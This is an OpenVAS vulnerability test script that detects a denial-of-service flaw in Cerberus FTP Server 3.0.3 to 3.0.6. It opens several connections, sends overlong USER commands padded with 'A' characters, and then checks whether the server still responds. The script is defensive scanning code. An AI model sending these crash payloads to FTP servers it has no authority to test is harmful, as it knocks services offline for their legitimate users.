###############################################################################
# OpenVAS Vulnerability Test
# $Id: cerberus_ftp_server_36390.nasl 13485 2019-02-06 07:53:13Z cfischer $
#
# Cerberus FTP Server Long Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100284");
  script_version("$Revision: 13485 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 08:53:13 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-10-02 19:48:14 +0200 (Fri, 02 Oct 2009)");
  script_bugtraq_id(36390);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_name("Cerberus FTP Server Long Command Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36390");
  script_xref(name:"URL", value:"http://www.cerberusftp.com/index.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/506858");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/cerberus/detected");

  script_tag(name:"summary", value:"Cerberus FTP Server is prone to a denial-of-service vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to terminate the affected
  application, denying service to legitimate users.");

  script_tag(name:"affected", value:"This issue affects Cerberus FTP Server 3.0.3 through 3.0.6. Other
  versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(!banner || "Cerberus" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
soc2 = open_sock_tcp(ftpPort);
soc3 = open_sock_tcp(ftpPort);
soc4 = open_sock_tcp(ftpPort);

if(!soc1 || !soc2 || !soc3 || !soc4){
  exit(0);
}

req1 = string("USER ", crap(data: raw_string(0x41), length: 330), "\r\n");
req2 = string("USER ", crap(data: raw_string(0x41), length: 520), "\r\n");
req3 = string("USER ", crap(data: raw_string(0x41), length: 2230), "\r\n");

send(socket:soc1, data:req1);
send(socket:soc2, data:req2);
send(socket:soc3, data:req3);
send(socket:soc4, data:req1);

close(soc1);
close(soc2);
close(soc3);
close(soc4);

sleep(3);

soc = open_sock_tcp(ftpPort);

if(!ftp_recv_line(socket: soc)) {
   security_message(port:ftpPort);
   if(soc)close(soc);
   exit(0);
}

if(soc)close(soc);

exit(0);
